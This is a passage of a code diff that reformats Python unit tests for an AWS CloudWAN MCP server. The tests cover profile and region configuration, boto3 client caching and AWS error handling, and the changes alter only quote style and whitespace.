     async def test_set_profile_success_with_persistence(self, mock_boto3_session, mock_config_persistence_available):
         """Test successful profile setting with config persistence."""
-        with patch('awslabs.cloudwan_mcp_server.server.secure_environment_update', return_value=True):
+        with patch("awslabs.cloudwan_mcp_server.server.secure_environment_update", return_value=True):
             result = await aws_config_manager("set_profile", profile="new-test-profile")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "set_profile"
         assert result_data["new_profile"] == "new-test-profile"
@@ -193,13 +185,15 @@
         assert result_data["cache_cleared"] is True
 
     @pytest.mark.asyncio
-    async def test_set_profile_success_without_persistence(self, mock_boto3_session, mock_config_persistence_unavailable):
+    async def test_set_profile_success_without_persistence(
+        self, mock_boto3_session, mock_config_persistence_unavailable
+    ):
         """Test successful profile setting without config persistence."""
-        with patch('awslabs.cloudwan_mcp_server.server.secure_environment_update', return_value=True):
+        with patch("awslabs.cloudwan_mcp_server.server.secure_environment_update", return_value=True):
             result = await aws_config_manager("set_profile", profile="new-test-profile")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["config_persisted"] is False
         assert result_data["persistence_available"] is False
@@ -209,19 +203,19 @@
         """Test set_profile without providing profile name."""
         result = await aws_config_manager("set_profile")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Profile name is required" in result_data["error"]
 
     @pytest.mark.asyncio
     async def test_set_profile_invalid_profile(self):
         """Test set_profile with invalid profile name."""
-        with patch('boto3.Session') as mock_session:
+        with patch("boto3.Session") as mock_session:
             mock_session.side_effect = Exception("Profile not found")
-            
+
             result = await aws_config_manager("set_profile", profile="invalid-profile")
             result_data = json.loads(result)
-            
+
             assert result_data["success"] is False
             assert "Failed to validate profile" in result_data["error"]
             assert "suggestion" in result_data
@@ -229,22 +223,22 @@
     @pytest.mark.asyncio
     async def test_set_profile_environment_update_failure(self, mock_boto3_session):
         """Test set_profile when environment variable update fails."""
-        with patch('awslabs.cloudwan_mcp_server.server.secure_environment_update', return_value=False):
+        with patch("awslabs.cloudwan_mcp_server.server.secure_environment_update", return_value=False):
             result = await aws_config_manager("set_profile", profile="test-profile")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Failed to update AWS_PROFILE environment variable" in result_data["error"]
 
     @pytest.mark.asyncio
     async def test_set_region_success(self, mock_boto3_session, mock_config_persistence_available):
         """Test successful region setting."""
-        with patch('awslabs.cloudwan_mcp_server.server.secure_environment_update', return_value=True):
+        with patch("awslabs.cloudwan_mcp_server.server.secure_environment_update", return_value=True):
             result = await aws_config_manager("set_region", region="us-west-2")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "set_region"
         assert result_data["new_region"] == "us-west-2"
@@ -256,7 +250,7 @@
         """Test set_region without providing region name."""
         result = await aws_config_manager("set_region")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Region name is required" in result_data["error"]
 
@@ -265,7 +259,7 @@
         """Test set_region with invalid region format."""
         result = await aws_config_manager("set_region", region="INVALID_REGION!")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Invalid region format" in result_data["error"]
         assert "suggestion" in result_data
@@ -277,12 +271,12 @@
         mock_instance = mock_boto3_session.return_value
         mock_ec2 = mock_instance.client.return_value
         mock_ec2.describe_regions.return_value = {
-            'Regions': [{'RegionName': 'us-east-1'}]  # Only us-east-1 available
+            "Regions": [{"RegionName": "us-east-1"}]  # Only us-east-1 available
         }
-        
+
         result = await aws_config_manager("set_region", region="ap-south-1")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "is not available or accessible" in result_data["error"]
         assert "available_regions" in result_data
@@ -290,11 +284,11 @@
     @pytest.mark.asyncio
     async def test_set_both_success(self, mock_boto3_session, mock_config_persistence_available):
         """Test successful setting of both profile and region."""
-        with patch('awslabs.cloudwan_mcp_server.server.secure_environment_update', return_value=True):
+        with patch("awslabs.cloudwan_mcp_server.server.secure_environment_update", return_value=True):
             result = await aws_config_manager("set_both", profile="test-profile", region="us-east-1")
-            
+
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "set_both"
         assert result_data["new_profile"] == "test-profile"
@@ -307,7 +301,7 @@
         """Test set_both with missing parameters."""
         result = await aws_config_manager("set_both", profile="test-profile")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Both profile and region are required" in result_data["error"]
 
@@ -316,7 +310,7 @@
         """Test successful configuration validation."""
         result = await aws_config_manager("validate_config")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "validate_config"
         assert result_data["overall_status"] == "valid"
@@ -327,24 +321,25 @@
     @pytest.mark.asyncio
     async def test_validate_config_partial_failure(self):
         """Test configuration validation with some services failing."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_client:
+
             def failing_client(service, region=None):
                 if service == "sts":
                     mock_sts = Mock()
                     mock_sts.get_caller_identity.return_value = {
-                        'Account': '123456789012',
-                        'UserId': 'test',
-                        'Arn': 'test-arn'
+                        "Account": "123456789012",
+                        "UserId": "test",
+                        "Arn": "test-arn",
                     }
                     return mock_sts
                 else:
                     raise Exception("Service unavailable")
-                    
+
             mock_client.side_effect = failing_client
-            
+
             result = await aws_config_manager("validate_config")
             result_data = json.loads(result)
-            
+
             assert result_data["success"] is True
             assert result_data["overall_status"] == "invalid"
             assert result_data["service_validations"]["sts"]["status"] == "success"
@@ -355,16 +350,17 @@
         """Test clearing AWS client cache."""
         # Add items to cache by calling get_aws_client
         from awslabs.cloudwan_mcp_server.server import get_aws_client
+
         get_aws_client("networkmanager", "us-east-1")
         get_aws_client("ec2", "us-west-2")
-        
+
         result = await aws_config_manager("clear_cache")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "clear_cache"
         assert result_data["cache_entries_cleared"] >= 0  # May vary based on test execution
-        
+
         # Verify cache is cleared
         cache_info = _create_client.cache_info()
         assert cache_info.currsize == 0
@@ -374,7 +370,7 @@
         """Test getting config history when persistence is available."""
         result = await aws_config_manager("get_config_history")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "get_config_history"
         assert "history_count" in result_data
@@ -385,7 +381,7 @@
         """Test getting config history when persistence is unavailable."""
         result = await aws_config_manager("get_config_history")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Configuration persistence is not available" in result_data["error"]
         assert "reason" in result_data
@@ -395,7 +391,7 @@
         """Test persistence validation when persistence is available."""
         result = await aws_config_manager("validate_persistence")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "validate_persistence"
         assert "validation" in result_data
@@ -406,7 +402,7 @@
         """Test persistence validation when persistence is unavailable."""
         result = await aws_config_manager("validate_persistence")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["persistence_type"] == "MockConfigPersistence"
         assert result_data["validation"]["valid"] is False
@@ -416,7 +412,7 @@
         """Test restoring last config when persistence is available."""
         result = await aws_config_manager("restore_last_config")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is True
         assert result_data["operation"] == "restore_last_config"
         assert "restored_config" in result_data
@@ -427,7 +423,7 @@
         """Test restoring last config when persistence is unavailable."""
         result = await aws_config_manager("restore_last_config")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Configuration persistence is not available" in result_data["error"]
 
@@ -436,7 +432,7 @@
         """Test handling unknown operation."""
         result = await aws_config_manager("unknown_operation")
         result_data = json.loads(result)
-        
+
         assert result_data["success"] is False
         assert "Unknown operation" in result_data["error"]
         assert "supported_operations" in result_data
@@ -444,12 +440,12 @@
     @pytest.mark.asyncio
     async def test_exception_handling(self):
         """Test general exception handling."""
-        with patch('os.getenv') as mock_getenv:
+        with patch("os.getenv") as mock_getenv:
             mock_getenv.side_effect = Exception("Unexpected system error")
-            
+
             result = await aws_config_manager("get_current")
             result_data = json.loads(result)
-            
+
             # Should handle the exception gracefully
             assert "success" in result_data
             assert "error" in result_data
@@ -458,15 +454,15 @@
     async def test_lru_cache_behavior(self, mock_aws_clients):
         """Test that LRU cache behavior works correctly."""
         from awslabs.cloudwan_mcp_server.server import get_aws_client
-        
+
         # Clear cache first
         _create_client.cache_clear()
-        
+
         # Create multiple clients to test caching
         client1 = get_aws_client("sts", "us-east-1")
         client2 = get_aws_client("sts", "us-east-1")  # Should use cache
         client3 = get_aws_client("ec2", "us-west-2")  # Different service/region
-        
+
         cache_info = _create_client.cache_info()
         assert cache_info.hits >= 1  # At least one cache hit from client2
         assert cache_info.currsize >= 1  # At least one item in cache
@@ -475,22 +471,22 @@
     async def test_thread_safety_patterns(self, mock_aws_clients):
         """Test thread safety patterns in configuration management."""
         import asyncio
-        
+
         async def concurrent_operation(operation, **kwargs):
             return await aws_config_manager(operation, **kwargs)
-        
+
         # Run multiple operations concurrently
         tasks = [
             concurrent_operation("get_current"),
             concurrent_operation("validate_config"),
-            concurrent_operation("clear_cache")
+            concurrent_operation("clear_cache"),
         ]
-        
+
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         # Verify no exceptions were raised due to race conditions
         for result in results:
             assert not isinstance(result, Exception)
             if isinstance(result, str):
                 result_data = json.loads(result)
-                assert "success" in result_data
\ No newline at end of file
+                assert "success" in result_data

--- cloudwan-mcp-server/tests/unit/test_aws_config_manager_utils.py
+++ cloudwan-mcp-server/tests/unit/test_aws_config_manager_utils.py
@@ -19,11 +19,7 @@
 import pytest
 from unittest.mock import patch
 
-from awslabs.cloudwan_mcp_server.utils.aws_config_manager import (
-    AWSConfigManager,
-    get_aws_config,
-    safe_json_dumps
-)
+from awslabs.cloudwan_mcp_server.utils.aws_config_manager import AWSConfigManager, get_aws_config, safe_json_dumps
 
 
 class TestAWSConfigManager:
@@ -62,9 +58,10 @@
         """Test get_aws_config returns singleton instance."""
         # Clear any existing instance
         import awslabs.cloudwan_mcp_server.utils.aws_config_manager as module
-        if hasattr(module, '_aws_config_instance'):
-            delattr(module, '_aws_config_instance')
-        
+
+        if hasattr(module, "_aws_config_instance"):
+            delattr(module, "_aws_config_instance")
+
         config1 = get_aws_config()
         config2 = get_aws_config()
         assert config1 is config2
@@ -85,6 +82,7 @@
     def test_safe_json_dumps_with_datetime(self):
         """Test safe_json_dumps with datetime objects."""
         from datetime import datetime
+
         data = {"timestamp": datetime(2023, 1, 1, 12, 0, 0)}
         result = safe_json_dumps(data)
         parsed = json.loads(result)
@@ -95,7 +93,7 @@
         # Create circular reference
         data = {}
         data["self"] = data
-        
+
         result = safe_json_dumps(data)
         parsed = json.loads(result)
         assert parsed["success"] is False
@@ -117,8 +115,8 @@
     def test_module_exports(self):
         """Test that all expected symbols are exported."""
         import awslabs.cloudwan_mcp_server.utils.aws_config_manager as module
-        
-        expected_exports = ['AWSConfigManager', 'get_aws_config', 'safe_json_dumps']
+
+        expected_exports = ["AWSConfigManager", "get_aws_config", "safe_json_dumps"]
         for export in expected_exports:
             assert export in module.__all__
             assert hasattr(module, export)
@@ -162,6 +160,6 @@
         with patch.dict(os.environ, {"AWS_PROFILE": "test", "AWS_DEFAULT_REGION": "us-east-2"}):
             config1 = AWSConfigManager()
             config2 = AWSConfigManager()
-            
+
             assert config1.profile == config2.profile
-            assert config1.default_region == config2.default_region
\ No newline at end of file
+            assert config1.default_region == config2.default_region

--- cloudwan-mcp-server/tests/unit/test_aws_helpers.py
+++ cloudwan-mcp-server/tests/unit/test_aws_helpers.py
@@ -32,41 +32,41 @@
         _create_client.cache_clear()  # Clear LRU cache
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_default_region(self, mock_boto_client):
         """Test get_aws_client with default region configuration."""
         mock_client = Mock()
         mock_boto_client.return_value = mock_client
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-west-2'}):
-            result = get_aws_client('networkmanager')
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-west-2"}):
+            result = get_aws_client("networkmanager")
 
         assert result == mock_client
         mock_boto_client.assert_called_once()
 
         # Verify config was created with correct region
         call_args = mock_boto_client.call_args
-        assert call_args[0][0] == 'networkmanager'
-        assert call_args[1]['region_name'] == 'us-west-2'
-        assert isinstance(call_args[1]['config'], Config)
+        assert call_args[0][0] == "networkmanager"
+        assert call_args[1]["region_name"] == "us-west-2"
+        assert isinstance(call_args[1]["config"], Config)
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_explicit_region(self, mock_boto_client):
         """Test get_aws_client with explicitly provided region."""
         mock_client = Mock()
         mock_boto_client.return_value = mock_client
 
-        result = get_aws_client('ec2', region='eu-west-1')
+        result = get_aws_client("ec2", region="eu-west-1")
 
         assert result == mock_client
         mock_boto_client.assert_called_once()
 
         call_args = mock_boto_client.call_args
-        assert call_args[1]['region_name'] == 'eu-west-1'
+        assert call_args[1]["region_name"] == "eu-west-1"
 
     @pytest.mark.unit
-    @patch('boto3.Session')
+    @patch("boto3.Session")
     def test_get_aws_client_with_profile(self, mock_session_class):
         """Test get_aws_client with AWS profile configuration."""
         mock_session = Mock()
@@ -74,32 +74,29 @@
         mock_session.client.return_value = mock_client
         mock_session_class.return_value = mock_session
 
-        with patch.dict('os.environ', {
-            'AWS_PROFILE': 'test-profile',
-            'AWS_DEFAULT_REGION': 'us-east-1'
-        }):
-            result = get_aws_client('networkmanager')
+        with patch.dict("os.environ", {"AWS_PROFILE": "test-profile", "AWS_DEFAULT_REGION": "us-east-1"}):
+            result = get_aws_client("networkmanager")
 
         assert result == mock_client
-        mock_session_class.assert_called_once_with(profile_name='test-profile')
+        mock_session_class.assert_called_once_with(profile_name="test-profile")
         mock_session.client.assert_called_once()
 
         call_args = mock_session.client.call_args
-        assert call_args[0][0] == 'networkmanager'
-        assert isinstance(call_args[1]['config'], Config)
+        assert call_args[0][0] == "networkmanager"
+        assert isinstance(call_args[1]["config"], Config)
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_caching(self, mock_boto_client):
         """Test get_aws_client caches clients properly."""
         mock_client = Mock()
         mock_boto_client.return_value = mock_client
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             # First call
-            result1 = get_aws_client('networkmanager')
+            result1 = get_aws_client("networkmanager")
             # Second call with same parameters
-            result2 = get_aws_client('networkmanager')
+            result2 = get_aws_client("networkmanager")
 
         # Should return same cached client
         assert result1 == result2
@@ -109,24 +106,24 @@
         mock_boto_client.assert_called_once()
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_different_services_cached_separately(self, mock_boto_client):
         """Test different AWS services are cached separately."""
         mock_nm_client = Mock()
         mock_ec2_client = Mock()
 
         def client_side_effect(service, **kwargs):
-            if service == 'networkmanager':
+            if service == "networkmanager":
                 return mock_nm_client
-            elif service == 'ec2':
+            elif service == "ec2":
                 return mock_ec2_client
             return Mock()
 
         mock_boto_client.side_effect = client_side_effect
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            nm_client = get_aws_client('networkmanager')
-            ec2_client = get_aws_client('ec2')
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            nm_client = get_aws_client("networkmanager")
+            ec2_client = get_aws_client("ec2")
 
         assert nm_client == mock_nm_client
         assert ec2_client == mock_ec2_client
@@ -134,48 +131,49 @@
         assert mock_boto_client.call_count == 2
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_config_parameters(self, mock_boto_client):
         """Test get_aws_client creates Config with correct parameters."""
         mock_client = Mock()
         mock_boto_client.return_value = mock_client
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            get_aws_client('networkmanager')
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            get_aws_client("networkmanager")
 
         call_args = mock_boto_client.call_args
-        config = call_args[1]['config']
+        config = call_args[1]["config"]
 
         assert isinstance(config, Config)
         # Verify config parameters (accessing private attributes for testing)
-        assert config.region_name == 'us-east-1'
-        assert config.retries['max_attempts'] == 3
-        assert config.retries['mode'] == 'adaptive'
+        assert config.region_name == "us-east-1"
+        assert config.retries["max_attempts"] == 3
+        assert config.retries["mode"] == "adaptive"
         assert config.max_pool_connections == 10
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_fallback_region(self, mock_boto_client):
         """Test get_aws_client falls back to us-east-1 when no region specified."""
         mock_client = Mock()
         mock_boto_client.return_value = mock_client
 
         # Clear any AWS_DEFAULT_REGION
-        with patch.dict('os.environ', {}, clear=True):
-            result = get_aws_client('networkmanager')
+        with patch.dict("os.environ", {}, clear=True):
+            result = get_aws_client("networkmanager")
 
         assert result == mock_client
         call_args = mock_boto_client.call_args
-        assert call_args[1]['region_name'] == 'us-east-1'
+        assert call_args[1]["region_name"] == "us-east-1"
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_cache_key_generation(self, mock_boto_client):
         """Test cache key generation includes service, region, and profile."""
         mock_client1 = Mock()
         mock_client2 = Mock()
 
         call_count = 0
+
         def client_side_effect(*args, **kwargs):
             nonlocal call_count
             call_count += 1
@@ -184,21 +182,21 @@
         mock_boto_client.side_effect = client_side_effect
 
         # Same service, different regions - should create separate clients
-        with patch.dict('os.environ', {}, clear=True):
-            client1 = get_aws_client('networkmanager', region='us-east-1')
-            client2 = get_aws_client('networkmanager', region='us-west-2')
+        with patch.dict("os.environ", {}, clear=True):
+            client1 = get_aws_client("networkmanager", region="us-east-1")
+            client2 = get_aws_client("networkmanager", region="us-west-2")
 
         assert client1 != client2
         assert mock_boto_client.call_count == 2
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_get_aws_client_exception_handling(self, mock_boto_client):
         """Test get_aws_client handles exceptions appropriately."""
         mock_boto_client.side_effect = Exception("No AWS credentials found")
 
         with pytest.raises(Exception):
-            get_aws_client('networkmanager')
+            get_aws_client("networkmanager")
 
 
 class TestHandleAWSError:
@@ -208,131 +206,125 @@
     def test_handle_aws_client_error(self):
         """Test handle_aws_error with ClientError."""
         error_response = {
-            'Error': {
-                'Code': 'AccessDenied',
-                'Message': 'User: arn:aws:iam::123456789012:user/test is not authorized'
-            }
+            "Error": {"Code": "AccessDenied", "Message": "User: arn:aws:iam::123456789012:user/test is not authorized"}
         }
-        client_error = ClientError(error_response, 'ListCoreNetworks')
+        client_error = ClientError(error_response, "ListCoreNetworks")
 
-        result = handle_aws_error(client_error, 'List Core Networks')
+        result = handle_aws_error(client_error, "List Core Networks")
 
         # Parse JSON response
         import json
+
         parsed = json.loads(result)
 
-        assert parsed['success'] is False
-        assert 'List Core Networks failed:' in parsed['error']
-        assert 'not authorized' in parsed['error']
-        assert parsed['error_code'] == 'AccessDenied'
+        assert parsed["success"] is False
+        assert "List Core Networks failed:" in parsed["error"]
+        assert "not authorized" in parsed["error"]
+        assert parsed["error_code"] == "AccessDenied"
 
     @pytest.mark.unit
     def test_handle_aws_client_error_missing_details(self):
         """Test handle_aws_error with ClientError missing error details."""
-        error_response = {'Error': {}}
-        client_error = ClientError(error_response, 'DescribeGlobalNetworks')
+        error_response = {"Error": {}}
+        client_error = ClientError(error_response, "DescribeGlobalNetworks")
 
-        result = handle_aws_error(client_error, 'Describe Global Networks')
+        result = handle_aws_error(client_error, "Describe Global Networks")
 
         import json
+
         parsed = json.loads(result)
 
-        assert parsed['success'] is False
-        assert 'Describe Global Networks failed:' in parsed['error']
-        assert parsed['error_code'] == 'Unknown'
+        assert parsed["success"] is False
+        assert "Describe Global Networks failed:" in parsed["error"]
+        assert parsed["error_code"] == "Unknown"
 
     @pytest.mark.unit
     def test_handle_generic_exception(self):
         """Test handle_aws_error with generic Exception."""
         generic_error = ValueError("Invalid parameter format")
 
-        result = handle_aws_error(generic_error, 'Validate Input')
+        result = handle_aws_error(generic_error, "Validate Input")
 
         import json
+
         parsed = json.loads(result)
 
-        assert parsed['success'] is False
-        assert 'Validate Input failed:' in parsed['error']
-        assert 'Invalid parameter format' in parsed['error']
+        assert parsed["success"] is False
+        assert "Validate Input failed:" in parsed["error"]
+        assert "Invalid parameter format" in parsed["error"]
         # Generic exceptions don't have error_code in current implementation
-        assert 'error_code' not in parsed
+        assert "error_code" not in parsed
 
     @pytest.mark.unit
     def test_handle_aws_error_json_formatting(self):
         """Test handle_aws_error returns properly formatted JSON."""
-        error_response = {
-            'Error': {
-                'Code': 'ResourceNotFound',
-                'Message': 'The specified core network does not exist'
-            }
-        }
-        client_error = ClientError(error_response, 'GetCoreNetworkPolicy')
+        error_response = {"Error": {"Code": "ResourceNotFound", "Message": "The specified core network does not exist"}}
+        client_error = ClientError(error_response, "GetCoreNetworkPolicy")
 
-        result = handle_aws_error(client_error, 'Get Policy')
+        result = handle_aws_error(client_error, "Get Policy")
 
         # Verify it's valid JSON
         import json
+
         parsed = json.loads(result)
 
         # Verify formatting with indent
-        assert '\n' in result  # Should be indented
+        assert "\n" in result  # Should be indented
         assert '  "success": false' in result
         assert '  "error_code": "ResourceNotFound"' in result
 
     @pytest.mark.unit
     def test_handle_aws_error_operation_context(self):
         """Test handle_aws_error includes operation context in error message."""
-        operations = [
-            'List Core Networks',
-            'Describe VPCs',
-            'Validate Policy Document',
-            'Trace Network Path'
-        ]
+        operations = ["List Core Networks", "Describe VPCs", "Validate Policy Document", "Trace Network Path"]
 
         for operation in operations:
             error = ValueError("Test error")
             result = handle_aws_error(error, operation)
 
             import json
+
             parsed = json.loads(result)
 
-            assert operation in parsed['error']
-            assert 'Test error' in parsed['error']
+            assert operation in parsed["error"]
+            assert "Test error" in parsed["error"]
 
     @pytest.mark.unit
     def test_handle_aws_error_with_special_characters(self):
         """Test handle_aws_error handles special characters in error messages."""
         error_response = {
-            'Error': {
-                'Code': 'ValidationException',
-                'Message': 'Invalid CIDR: "192.168.1.0/33" contains special chars: @#$%'
+            "Error": {
+                "Code": "ValidationException",
+                "Message": 'Invalid CIDR: "192.168.1.0/33" contains special chars: @#$%',
             }
         }
-        client_error = ClientError(error_response, 'ValidateNetworkConfiguration')
+        client_error = ClientError(error_response, "ValidateNetworkConfiguration")
 
-        result = handle_aws_error(client_error, 'Validate Network')
+        result = handle_aws_error(client_error, "Validate Network")
 
         import json
+
         parsed = json.loads(result)
 
-        assert parsed['success'] is False
-        assert '@#$%' in parsed['error']  # Special characters preserved
-        assert parsed['error_code'] == 'ValidationException'
+        assert parsed["success"] is False
+        assert "@#$%" in parsed["error"]  # Special characters preserved
+        assert parsed["error_code"] == "ValidationException"
 
     @pytest.mark.unit
     def test_handle_aws_error_empty_operation(self):
         """Test handle_aws_error with empty operation string."""
         error = RuntimeError("Connection timeout")
 
-        result = handle_aws_error(error, '')
+        result = handle_aws_error(error, "")
 
         import json
+
         parsed = json.loads(result)
 
-        assert parsed['success'] is False
-        assert ' failed: Connection timeout' in parsed['error']
+        assert parsed["success"] is False
+        assert " failed: Connection timeout" in parsed["error"]
         # Generic exceptions don't have error_code in current implementation
-        assert 'error_code' not in parsed
+        assert "error_code" not in parsed
 
     @pytest.mark.unit
     def test_handle_aws_error_datetime_in_response(self):
@@ -341,21 +333,22 @@
 
         # Create error that might contain datetime info
         error_response = {
-            'Error': {
-                'Code': 'ThrottlingException',
-                'Message': f'Request rate exceeded at {datetime.now().isoformat()}'
+            "Error": {
+                "Code": "ThrottlingException",
+                "Message": f"Request rate exceeded at {datetime.now().isoformat()}",
             }
         }
-        client_error = ClientError(error_response, 'ListCoreNetworks')
+        client_error = ClientError(error_response, "ListCoreNetworks")
 
-        result = handle_aws_error(client_error, 'List Resources')
+        result = handle_aws_error(client_error, "List Resources")
 
         import json
+
         parsed = json.loads(result)  # Should not raise JSON decode error
 
-        assert parsed['success'] is False
-        assert parsed['error_code'] == 'ThrottlingException'
-        assert 'Request rate exceeded' in parsed['error']
+        assert parsed["success"] is False
+        assert parsed["error_code"] == "ThrottlingException"
+        assert "Request rate exceeded" in parsed["error"]
 
 
 class TestAWSClientCaching:
@@ -367,7 +360,7 @@
 
     def test_client_cache_isolation(self):
         """Test cache isolation between configurations."""
-        get_aws_client('networkmanager', 'us-east-1')
+        get_aws_client("networkmanager", "us-east-1")
         cache_info = _create_client.cache_info()
         assert cache_info.currsize == 1
 
@@ -378,15 +371,15 @@
         _create_client.cache_clear()
 
         # Test cache behavior by creating clients that should be cached
-        with patch('boto3.client') as mock_boto_client:
+        with patch("boto3.client") as mock_boto_client:
             mock_client = Mock()
             mock_boto_client.return_value = mock_client
 
             # Fill cache to near capacity by creating different client configurations
-            with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+            with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
                 for i in range(CACHE_CAPACITY - 1):
                     # Create clients for different services to fill cache
-                    service = f'service-{i}'
+                    service = f"service-{i}"
                     get_aws_client(service)
 
             # Verify cache is being used
@@ -394,7 +387,7 @@
             assert initial_cache_info.currsize == CACHE_CAPACITY - 1
 
             # Add one more to trigger potential eviction
-            get_aws_client('new-service')
+            get_aws_client("new-service")
 
             # Verify cache management
             final_cache_info = _create_client.cache_info()
@@ -403,14 +396,14 @@
     @pytest.mark.unit
     def test_client_cache_cleanup(self):
         """Test client cache can be cleared properly."""
-        with patch('boto3.client') as mock_boto_client:
+        with patch("boto3.client") as mock_boto_client:
             mock_client = Mock()
             mock_boto_client.return_value = mock_client
 
             # Add entries to cache
-            with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-                get_aws_client('networkmanager')
-                get_aws_client('ec2')
+            with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+                get_aws_client("networkmanager")
+                get_aws_client("ec2")
 
             cache_info = _create_client.cache_info()
             assert cache_info.currsize >= 1
@@ -424,13 +417,13 @@
     def test_client_cache_thread_safety_pattern(self):
         """Test client cache follows thread-safe access patterns."""
         # This test verifies the LRU cache is thread-safe
-        with patch('boto3.client') as mock_boto_client:
+        with patch("boto3.client") as mock_boto_client:
             mock_client = Mock()
             mock_boto_client.return_value = mock_client
 
             # Test basic cache operations don't raise exceptions
-            with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-                client = get_aws_client('networkmanager')
+            with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+                client = get_aws_client("networkmanager")
                 assert client == mock_client
 
             cache_info = _create_client.cache_info()

--- cloudwan-mcp-server/tests/unit/test_aws_labs_patterns.py
+++ cloudwan-mcp-server/tests/unit/test_aws_labs_patterns.py
@@ -28,21 +28,21 @@
         config_manager = AWSConfigManager()
 
         # AWS Labs standard: config manager should have region and profile handling
-        assert hasattr(config_manager, 'region')
-        assert hasattr(config_manager, 'profile')
+        assert hasattr(config_manager, "region")
+        assert hasattr(config_manager, "profile")
 
     @pytest.mark.unit
-    @patch('boto3.client')
+    @patch("boto3.client")
     def test_aws_client_creation_patterns(self, mock_boto_client):
         """Test AWS client creation following AWS Labs patterns."""
         mock_client = Mock()
         mock_boto_client.return_value = mock_client
 
         config_manager = AWSConfigManager()
-        client = config_manager.get_aws_client('networkmanager')
+        client = config_manager.get_aws_client("networkmanager")
 
         # Verify boto3 client was called with proper service
-        mock_boto_client.assert_called_once_with('networkmanager', region_name=config_manager.region)
+        mock_boto_client.assert_called_once_with("networkmanager", region_name=config_manager.region)
         assert client == mock_client
 
     @pytest.mark.unit
@@ -53,11 +53,11 @@
         error_response = format_error_response("Test error", "TEST_ERROR")
 
         # AWS Labs standard error format
-        assert error_response['success'] is False
-        assert 'error' in error_response
-        assert 'error_code' in error_response
-        assert error_response['error'] == "Test error"
-        assert error_response['error_code'] == "TEST_ERROR"
+        assert error_response["success"] is False
+        assert "error" in error_response
+        assert "error_code" in error_response
+        assert error_response["error"] == "Test error"
+        assert error_response["error_code"] == "TEST_ERROR"
 
     @pytest.mark.unit
     def test_success_response_format_compliance(self):
@@ -68,9 +68,9 @@
         success_response = format_success_response(test_data)
 
         # AWS Labs standard success format
-        assert success_response['success'] is True
-        assert 'data' in success_response
-        assert success_response['data'] == test_data
+        assert success_response["success"] is True
+        assert "data" in success_response
+        assert success_response["data"] == test_data
 
     @pytest.mark.unit
     @pytest.mark.asyncio
@@ -79,9 +79,9 @@
         from awslabs.cloudwan_mcp_server.tools.base import BaseMCPTool
 
         # Test abstract base class behavior
-        assert hasattr(BaseMCPTool, 'execute')
-        assert hasattr(BaseMCPTool, 'validate_input')
-        assert hasattr(BaseMCPTool, 'format_response')
+        assert hasattr(BaseMCPTool, "execute")
+        assert hasattr(BaseMCPTool, "validate_input")
+        assert hasattr(BaseMCPTool, "format_response")
 
     @pytest.mark.unit
     def test_input_validation_patterns(self):
@@ -93,6 +93,7 @@
             validate_global_network_id,
             validate_ip_address,
         )
+
         # Generate exactly 17 hex characters as required by validation pattern
         hex_suffix = secrets.token_hex(9)[:17]  # 9 bytes gives 18 hex chars, take first 17
         valid_core_id = f"core-network-{hex_suffix}"
@@ -109,7 +110,7 @@
 
     @pytest.mark.unit
     @pytest.mark.asyncio
-    @patch('awslabs.cloudwan_mcp_server.utils.aws_config_manager.get_aws_client')
